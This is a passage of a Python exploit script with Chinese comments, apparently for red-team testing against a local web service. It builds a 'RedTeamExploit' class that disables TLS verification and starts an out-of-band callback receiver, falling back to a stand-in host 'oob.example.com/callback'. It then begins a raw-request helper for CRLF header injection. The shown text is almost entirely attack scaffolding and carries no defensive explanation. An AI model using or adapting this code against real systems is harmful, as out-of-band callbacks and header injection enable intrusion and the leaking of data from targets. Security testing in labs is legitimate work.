    \n# 禁用 SSL 警告\nurllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\n\
    \n# 目标配置\nTARGET_URL = \"http://localhost:9082\"\nOOB_CALLBACK_URL = None  # 将在运行时设置\n\
    \nclass RedTeamExploit:\n    def __init__(self, target_url: str):\n        self.target_url\
    \ = target_url.rstrip('/')\n        self.session = requests.Session()\n      \
    \  self.session.verify = False\n        self.session.trust_env = False\n     \
    \   \n        # 设置 OOB 接收器\n        self.oob_receiver = None\n        self._setup_oob()\n\
    \        \n    def _setup_oob(self):\n        \"\"\"设置带外接收器\"\"\"\n        try:\n\
    \            # 尝试使用默认端口启动 OOB 接收器\n            self.oob_receiver = OOBReceiver(port=8765)\n\
    \            self.oob_receiver.start()\n            global OOB_CALLBACK_URL\n\
    \            OOB_CALLBACK_URL = self.oob_receiver.url\n            print(f\"[+]\
    \ OOB 接收器启动在: {OOB_CALLBACK_URL}\")\n        except Exception as e:\n        \
    \    print(f\"[-] OOB 接收器启动失败: {e}\")\n            # 使用公共回调服务\n            OOB_CALLBACK_URL\
    \ = \"http://oob.example.com/callback\"\n    \n    def _send_raw_request(self,\
    \ method: str, path: str, headers: Dict[str, str], body: bytes = b\"\") -> http.client.HTTPResponse:\n\
    \        \"\"\"发送原始 HTTP 请求，用于 CRLF 注入\"\"\"\n        parsed = urllib.parse.urlparse(self.target_url)\n\
    \        conn = http.client.HTTPConnection(parsed.hostname, parsed.port or 80,\
    \ timeout=10)\n        \n        try:\n            # 构建原始请求行和头部\n            request_line\
